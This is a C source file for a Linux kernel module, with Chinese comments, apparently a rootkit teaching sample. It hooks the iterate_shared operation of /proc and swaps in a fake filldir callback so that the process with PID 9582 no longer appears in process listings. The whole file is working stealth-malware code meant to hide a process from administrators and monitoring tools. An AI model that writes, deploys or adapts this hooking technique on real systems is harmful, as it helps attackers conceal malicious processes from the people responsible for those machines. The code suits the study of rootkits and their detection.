#define DEBUG 1

# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/fs.h> // filp_open, filp_close.
# endif // CPP

# include "hide_process.h"

MODULE_LICENSE("GPL");

# define ROOT_PATH "/proc"
# define SECRET_PROC 9582

int (*real_iterate_shared)(struct file *, struct dir_context *); 
int (*real_filldir)(struct dir_context *, const char *, int, \
                    loff_t, u64, unsigned);


int
fake_iterate_shared(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);


int fake_iterate_shared(struct file *filp, struct dir_context *ctx)
{
    // 备份真的 ``filldir``，以备后面之需。
    real_filldir = ctx->actor;

    // 把 ``struct dir_context`` 里的 ``actor``，
    // 也就是真的 ``filldir``
    // 替换成我们的假 ``filldir``
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate_shared(filp, ctx);
}

int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    char *endp;
    long pid;

    // 把字符串变成长整数。
    pid = simple_strtol(name, &endp, 10);
	//printk("%s",name);
    if (pid == SECRET_PROC) {
        // 是我们需要隐藏的进程，直接返回。
        printk("Hiding pid: %ld", pid);
        return 0;
    }
    // 不是需要隐藏的进程，交给真的 ``filldir`` 填到缓冲区里。
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}



//Module init and exit
static int __init hide_process_init(void)
{
	set_f_op(iterate_shared, ROOT_PATH, fake_iterate_shared, real_iterate_shared);

	if(!real_iterate_shared){
	    return -ENOENT;
	}
	return 0;
}

static void __exit hide_process_exit(void)
{
	if(real_iterate_shared){
		void *dummy;
		set_f_op(iterate_shared, ROOT_PATH, real_iterate_shared, dummy);
	}		
}


module_init(hide_process_init);
module_exit(hide_process_exit);


